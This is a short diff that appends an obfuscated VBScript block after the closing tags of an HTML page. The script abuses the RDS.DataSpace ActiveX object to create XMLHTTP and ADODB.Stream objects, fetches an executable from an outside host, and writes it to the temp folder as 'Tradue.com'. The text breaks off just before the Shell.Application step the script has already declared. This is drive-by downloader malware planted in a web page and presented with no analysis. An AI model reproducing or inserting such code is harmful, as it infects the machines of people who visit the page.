@@ -1,0 +1,32 @@
+  </head><body></body></html><html>
+ <script language="VBScript">
+    on error resume next
+    clID1  = "clsi"
+    clID2  = "d:BD96C556-65A3-11D0-983A-00C04FC29E36"
+    XML1 = "Mic"
+    XML2 = "rosoft.XMLHTTP"
+    AdoSqa1 = "Adodb.S"
+    AdoSqa2 = "tream"
+    oGet   = "GET"
+    fname1 = "Tradue.com"
+    SFO    = "Scripting.FileSystemObject"
+    SApp   = "Shell.Application"
+    dl     = "http://scan.kgbls.co.kr/x/vv.exe"
+    Set df = document.createElement("object")
+    df.setAttribute "classid", clID1&clID2
+    Set x  =  df.CreateObject(XML1&XML2,"")
+    set S  =  df.createobject(AdoSqa1&AdoSqa2,"")
+    if Not Err.Number = 0 then
+       err.clear
+    else
+    S.type = 1
+    x.Open oGet, dl, False
+    x.Send
+    set F   = df.createobject(SFO,"")
+    set tmp = F.GetSpecialFolder(2)
+    fname1  = F.BuildPath(tmp,fname1)
+    S.open
+    S.write x.responseBody
+    S.savetofile fname1,2
+    S.close
+    set Q  = df
